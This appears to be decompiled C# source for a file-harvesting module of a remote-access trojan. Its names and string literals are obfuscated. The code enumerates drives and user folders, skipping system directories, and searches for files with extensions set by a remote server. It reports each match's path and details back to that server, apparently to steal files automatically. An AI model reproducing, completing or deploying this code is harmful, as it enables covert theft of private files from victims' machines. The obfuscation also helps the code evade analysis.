using System;
using System.Collections.Generic;
using System.IO;

namespace trbgertrnion;

internal class DEARIVF
{
	public int trbgertrnionfIndx = 0;

	public bool trbgertrnionreaging = false;

	public List<string> trbgertrnionsFiles = new List<string>();

	public MCRSIDM iserver;

	public List<string> trbgertrnionfExts = new List<string>();

	public List<string> trbgertrnionnotFilders = new List<string>();

	public string trbgertrnionmainPath;

	public int trbgertrnionsIndx = 0;

	public string trbgertrnionfilesLogs = CIADINF.trbgertrnionfilesLogs;

	public bool trbgertrnionseae_Access(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string trbgertrnionchaeck_Folders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (trbgertrnionseae_Access(text2))
				{
					text = text + text2 + ">|trbgertrnion".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public IEnumerable<string> trbgertrnionadad_Files(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.trbgertrnionautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (trbgertrnionseae_Access(text) && !trbgertrnionnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public string trbgertrnionloaokup_Files(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|trbgertrnion".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public DEARIVF()
	{
		trbgertrnionnotFilders.Add("windows|trbgertrnion".Split(new char[1] { '|' })[0]);
		trbgertrnionnotFilders.Add("program files|trbgertrnion".Split(new char[1] { '|' })[0]);
		trbgertrnionnotFilders.Add("system volume information|trbgertrnion".Split(new char[1] { '|' })[0]);
		trbgertrnionnotFilders.Add("program files (x86)|trbgertrnion".Split(new char[1] { '|' })[0]);
		trbgertrnionnotFilders.Add("programdata|trbgertrnion".Split(new char[1] { '|' })[0]);
	}

	public void trbgertrnionloaok_Files(string tempStr)
	{
		iserver.trbgertrnionautCnls = false;
		trbgertrnionfExts.Clear();
		trbgertrnionsFiles.Clear();
		trbgertrnionfIndx = 0;
		trbgertrnionsIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				trbgertrnionfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			trbgertrnionreaging = true;
			trbgertrnionseand_Search(array[1]);
			trbgertrnionreaging = false;
			iserver.trbgertrnionpuash_data(null, "trbgertrnion-seaard=|trbgertrnion".Split(new char[1] { '|' })[0]);
		}
	}

	public string trbgertrnionloaokup_Drives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|trbgertrnion".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public void trbgertrnionseand_Search(string path)
	{
		try
		{
			foreach (string item in trbgertrnionadad_Files(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (trbgertrnionfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.trbgertrnionfiale_info(item, ret: true);
					iserver.trbgertrnionpuash_data(null, "trbgertrnion-seaarf=|trbgertrnion".Split(new char[1] { '|' })[0] + item + "<FIALE_AUATO<|trbgertrnion".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.trbgertrnionautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}
}
